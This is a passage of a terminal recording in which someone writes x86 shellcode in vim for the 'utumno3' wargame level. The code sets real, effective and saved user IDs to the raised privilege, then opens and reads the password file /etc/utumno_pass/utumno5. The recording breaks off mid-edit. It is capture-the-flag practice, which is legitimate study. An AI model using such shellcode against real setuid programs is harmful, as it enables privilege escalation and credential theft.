[55.538, "o", "\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25lBITS 32\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25lglobal _start\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l_start:\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l    ; write(1, \"PWN!\", 4) -- marker so the address sweep can tell a hit from a crash\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l    xor eax, eax\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l    push eax\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l    push 0x214e5750\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l    mov ecx, esp\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l    xor ebx, ebx\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l    inc ebx\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l    xor edx, edx\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l    mov dl, 4\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25l    mov al, 4\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l    int 0x80\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l    ; euid = geteuid(); setreuid(euid,euid)\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25l    xor eax, eax\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l    mov al, 201\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25l    int 0x80\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25l    mov ebx, eax\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25l    mov ecx, eax\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25l    xor eax, eax\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25l    mov al, 70\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25l    int 0x80\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25l    ; setuid(euid) -- real, effective AND saved, so the privilege survives\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25l    xor eax, eax\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l    mov al, 201\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25l    int 0x80\u001b[28;1H\u001b[K\u001b[32;84H8\u001b[28;1H\u001b[?25h\u001b[?25l    mov ebx, eax\u001b[29;1H\u001b[K\u001b[32;84H9\u001b[29;1H\u001b[?25h\u001b[?25l    xor eax, eax\u001b[30;1H\u001b[K\u001b[32;83H30\u001b[30;1H\u001b[?25h\u001b[?25l    mov al, 23\u001b[31;1H\u001b[K\u001b[32;84H1\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hint 0x80\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5H; \"/etc/utumno_pass/utumno5\" pushed as six little-endian dwords.\u001b[32;83H\u001b[K\u001b[32;83H33,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5H; The shellcode reads the file itself because utumno3's getchar loop has\u001b[32;83H\u001b[K\u001b[32;83H34,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5H; already consumed all of stdin -- a spawned shell would get no commands.\u001b[32;83H\u001b[K\u001b[32;83H35,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hxor eax, eax\u001b[32;83H\u001b[K\u001b[32;83H36,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpush eax\u001b[16C; NUL terminator\u001b[32;83H\u001b[K\u001b[32;83H37,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpush 0x356f6e6d\u001b[9C; \"mno5\"\u001b[32;83H\u001b[K\u001b[32;83H38,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpush 0x7574752f\u001b[9C; \"/utu\"\u001b[32;83H\u001b[K\u001b[32;83H39,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpush 0x73736170\u001b[9C; \"pass\"\u001b[32;83H\u001b[K\u001b[32;83H40,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpush 0x5f6f6e6d\u001b[9C; \"mno_\"\u001b[32;83H\u001b[K\u001b[32;83H41,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpush 0x7574752f\u001b[9C; \"/utu\"\u001b[32;83H\u001b[K\u001b[32;83H42,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpush 0x6374652f\u001b[9C; \"/etc\"\u001b[32;83H\u001b[K\u001b[32;83H43,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hmov ebx, esp\u001b[32;83H\u001b[K\u001b[32;83H44,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hxor ecx, ecx\u001b[32;83H\u001b[K\u001b[32;83H45,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hxor eax, eax\u001b[32;83H\u001b[K\u001b[32;83H46,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hmov al, 5\u001b[15C; open(path, O_RDONLY)\u001b[32;83H\u001b[K\u001b[32;83H47,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hint 0x80\u001b[32;83H\u001b[K\u001b[32;83H48,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5H; read(fd, buf, 64)\u001b[32;83H\u001b[K\u001b[32;83H49,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hmov ebx, eax\u001b[32;83H\u001b[K\u001b[32;83H50,1\u001b[10CBo